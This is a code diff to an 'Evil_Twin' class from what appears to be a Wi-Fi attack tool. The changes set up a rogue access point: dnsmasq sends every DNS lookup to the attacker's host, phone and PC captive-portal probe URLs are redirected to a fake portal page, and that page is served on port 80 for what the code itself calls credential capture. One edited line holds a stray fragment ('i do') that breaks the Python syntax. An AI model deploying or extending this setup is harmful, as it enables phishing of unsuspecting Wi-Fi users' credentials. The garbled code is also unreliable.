@@ -2381,20 +2381,26 @@ class Evil_Twin():
             data_dnsmasq = dedent(
             f"""
             interface={iface}
+            bind-interfaces
+            listen-address=10.0.0.1
             dhcp-authoritative
             dhcp-range=10.0.0.10,10.0.0.100,12h
             dhcp-option=3,10.0.0.1
             dhcp-option=6,10.0.0.1
-            server=8.8.8.8
+            dhcp-leasefile=/var/lib/misc/dnsmasq.leases
+            address=/#/10.0.0.1
+            no-resolv
+            no-hosts
             log-queries
             log-dhcp
+            log-facility=/var/log/dnsmasq_evil.log
                 """).strip(); what = "dnsmasq.conf"
-            
+
             path = str(path / "dnsmasq.conf")
             with open(path, "w") as file: file.write(data_dnsmasq)
             if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what} - {path}")
             return path
-        
+
 
         except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")
 
@@ -2483,7 +2489,7 @@ class Evil_Twin():
             ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
              "-p", "tcp", "--dport", "80", "-j", "REDIRECT",
              "--to-port", "8000"
-             ],
+i do             ],
             check=False  # Ignore errors if iptables nat table doesn't exist
         )
 
@@ -2512,10 +2518,64 @@ class Evil_Twin():
         def do_GET(self):
             """This will handle http requests that are made"""
 
-            if self.path == "/":
-                self.path = "/index.html"
+            # Captive portal detection URLs - redirect to portal
+            if self.path in ['/hotspot-detect.html', '/library/test/success.html']:
+                self.send_response(302)
+                self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
+                self.end_headers()
+                return
 
-            super().do_GET()
+            if self.path in ['/generate_204', '/gen_204']:
+                self.send_response(302)
+                self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
+                self.end_headers()
+                return
+
+            if self.path in ['/ncsi.txt', '/connecttest.txt']:
+                self.send_response(302)
+                self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
+                self.end_headers()
+                return
+
+            # Serve files from portal directory
+            try:
+                if self.path == '/' or self.path == '':
+                    file_path = 'index.html'
+                else:
+                    file_path = self.path.lstrip('/')
+                    if '..' in file_path:
+                        file_path = 'index.html'
+
+                try:
+                    with open(file_path, 'rb') as f:
+                        content = f.read()
+                except FileNotFoundError:
+                    with open('index.html', 'rb') as f:
+                        content = f.read()
+
+                # Set content type
+                if file_path.endswith('.html'):
+                    content_type = 'text/html'
+                elif file_path.endswith('.css'):
+                    content_type = 'text/css'
+                elif file_path.endswith('.js'):
+                    content_type = 'application/javascript'
+                elif file_path.endswith('.png'):
+                    content_type = 'image/png'
+                elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
+                    content_type = 'image/jpeg'
+                else:
+                    content_type = 'text/html'
+
+                self.send_response(200)
+                self.send_header('Content-type', content_type)
+                self.end_headers()
+                self.wfile.write(content)
+
+            except Exception as e:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(b'Portal page not found')
 
         def do_POST(self):
             """Handle credential capture from portals"""
@@ -2536,10 +2596,10 @@ class Evil_Twin():
             else:
                 self.send_response(404)
                 self.end_headers()
-        
-        
+
+
         @staticmethod
-        def _Start_HTTP_Server(path, address="0.0.0.0", port=8000):
+        def _Start_HTTP_Server(path, address="0.0.0.0", port=80):
             """This will launch HTTP Server"""
 
 
